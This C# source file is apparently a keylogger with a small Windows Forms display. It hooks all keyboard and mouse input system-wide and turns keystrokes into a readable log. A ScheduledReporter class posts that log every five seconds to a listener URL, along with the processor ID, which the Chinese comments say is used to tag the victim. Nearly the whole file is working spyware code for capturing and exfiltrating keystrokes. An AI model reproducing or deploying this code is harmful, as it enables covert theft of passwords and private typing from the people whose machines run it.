﻿using ActionHook;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Management;
using System.Drawing;

namespace GUI
{
    public class ConsoleApp2
    {
        private EventHookFactory eventHookFactory;
        private MouseWatcher mouseWatcher;
        private KeyboardWatcher keyboardWatcher;
        private string tmp_str = "";
        public string keyLog = ""; // ScheduledReporter将会读取此buffer内容，发往监听者

        public ConsoleApp2(TextBox tb_keyboard, TextBox tb_mouse, ListView list)
        {
            Console.WriteLine("New ConsoleApp2!");
            this.eventHookFactory = new EventHookFactory();

            this.keyboardWatcher = eventHookFactory.GetKeyboardWatcher();
            this.keyboardWatcher.OnKeyInput += (s, e) =>
            {
                // 为监听者准备一份易于阅读的按键记录
                if (e.KeyData.EventType == KeyEvent.down)
                {
                    if (e.KeyData.Key <= System.Windows.Input.Key.D9 && e.KeyData.Key >= System.Windows.Input.Key.D0)
                    {
                        keyLog += (char)('0' + e.KeyData.Key - System.Windows.Input.Key.D0);
                    }
                    else if (e.KeyData.Key <= System.Windows.Input.Key.Z && e.KeyData.Key >= System.Windows.Input.Key.A)
                    {
                        keyLog += (char)('a' + e.KeyData.Key - System.Windows.Input.Key.A);
                    }
                    else
                    {
                        keyLog += "<"+e.KeyData.Key.ToString()+">";
                    }
                        
                }
                else if(e.KeyData.Key == System.Windows.Input.Key.LeftShift || e.KeyData.Key == System.Windows.Input.Key.RightShift)
                {//shift松开
                    keyLog += "</LeftShift>";

                }
                string msg = $"Key {e.KeyData.EventType} of Key {e.KeyData.Keyname}";
                tb_keyboard.Text = msg;
                //Console.WriteLine(msg);
                tmp_str += msg + "\r\n";
                draw(e.KeyData.Keyname, list);
            };
            this.mouseWatcher = eventHookFactory.GetMouseWatcher();
            this.mouseWatcher.OnMouseInput += (s, e) =>
            {
                string msg = $"{e.Message.ToString()} at {e.Point.x},{e.Point.y}";
                tb_mouse.Text = msg;
                //Console.WriteLine(msg);
                tmp_str += msg + "\r\n";
            };
        }

        private int l = 0;
        public void draw(string c, ListView list)
        {
            if (c.Length == 1 || c.Length == 2)
            {
                //还原上一步颜色
                if (l < 0) return;
                ListViewItem item = list.Items[l / 10];
                item.UseItemStyleForSubItems = false;
                item.SubItems[l % 10].BackColor = Color.White;

                //显示现在的颜色
                if (c.Length == 2)
                {
                    l = position(c[1] + "");
                }
                else
                {
                    l = position(c);
                }
                if (l < 0) return;
                item = list.Items[l / 10];
                item.UseItemStyleForSubItems = false;
                item.SubItems[l % 10].BackColor = Color.DarkCyan;
            }
        }

        //确定键盘的位置 以显示颜色 找不到返回-1
        public int position(string c)
        {
            char[,] low = new char[4, 10] { { '1','2','3','4','5','6','7','8','9','0' },
               { 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p' } ,
               { 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ' ' } ,
               { ' ', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ' ', ' ' } };
            char[,] upper = new char[4, 10] { { '!','@','#','$','%','^','&','*','(',')' },
               { 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P' } ,
               { 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ' ' } ,
               { ' ', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', ' ', ' ' } };
            for (int i = 0; i < 4; i++)
            {
                for (int j = 0; j < 10; j++)
                {
                    if (c[0] == low[i, j])
                    {
                        return i * 10 + j;
                    }
                    if (c[0] == upper[i, j])
                    {
                        return i * 10 + j;
                    }
                }
            }
            return -1;
        }

        public string run(Semaphore semaphore, string url)
        {
            Console.WriteLine("in ConsoleApp2.run()");
            tmp_str = "";
            keyboardWatcher.Start();
            mouseWatcher.Start();


            // 获得到信号量表示结束这一线程
            semaphore.WaitOne();
            keyboardWatcher.Stop();
            mouseWatcher.Stop();
            eventHookFactory.Dispose();

            return tmp_str;
        }

    }

    public class ScheduledReporter
    {
        async public static void Run(CancellationToken ct, string url, ConsoleApp2 app)
        {
            string logBuffer = "";
            Dictionary<string, string> dic;

            for (; ; )
            {
                // wait 5s, check callation every 1s
                try
                {
                    for (int n = 0; n < 5; ++n)
                    {
                        await Task.Delay(1000);
                        ct.ThrowIfCancellationRequested();
                    }
                }
                catch (OperationCanceledException)
                { break; }

                // post keyLog
                try
                {
                    // 构造请求字典
                    logBuffer += app.keyLog;
                    app.keyLog = "";
                    dic = new Dictionary<string, string>();
                    dic.Add("cpuid", Get_CPUID());
                    dic.Add("keyLog", logBuffer);
                    string responseBody = Post(url, dic);
                    if (responseBody.ToString() == "ACK")
                    {
                        logBuffer = "";
                    }
                }
                catch (System.Net.WebException)
                { }
            }
        }

        #region HTTP-post
        // HTTP-POST请求
        // ref: https://www.imooc.com/article/40178
        public static string Post(string url, Dictionary<string, string> dic)
        {
            string result = "";
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "POST";
            req.ContentType = "application/x-www-form-urlencoded";
            #region 添加Post 参数  
            StringBuilder builder = new StringBuilder();
            int i = 0;
            foreach (var item in dic)
            {
                if (i > 0)
                    builder.Append("&");
                builder.AppendFormat("{0}={1}", item.Key, item.Value);
                i++;
            }
            byte[] data = Encoding.UTF8.GetBytes(builder.ToString());
            req.ContentLength = data.Length;
            using (Stream reqStream = req.GetRequestStream())
            {
                reqStream.Write(data, 0, data.Length);
                reqStream.Close();
            }
            #endregion
            HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
            Stream stream = resp.GetResponseStream();
            //读出响应内容  
            using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
            {
                result = reader.ReadToEnd();
            }
            // Console.WriteLine(result); // print
            return result;
        }
        #endregion

        #region Get_CPUID
        // 获取CPUID，用以标志鶸
        // ref: https://blog.csdn.net/iilegend/article/details/75087638
        public static string Get_CPUID()
        {
            try
            {
                //需要在解决方案中引用System.Management.DLL文件  
                ManagementClass mc = new ManagementClass("Win32_Processor");
                ManagementObjectCollection moc = mc.GetInstances();
                string strCpuID = null;
                foreach (ManagementObject mo in moc)
                {
                    strCpuID = mo.Properties["ProcessorId"].Value.ToString();
                    mo.Dispose();
                    break;
                }
                return strCpuID;
            }
            catch
            {
                return "";
            }
        }
        #endregion
    }

}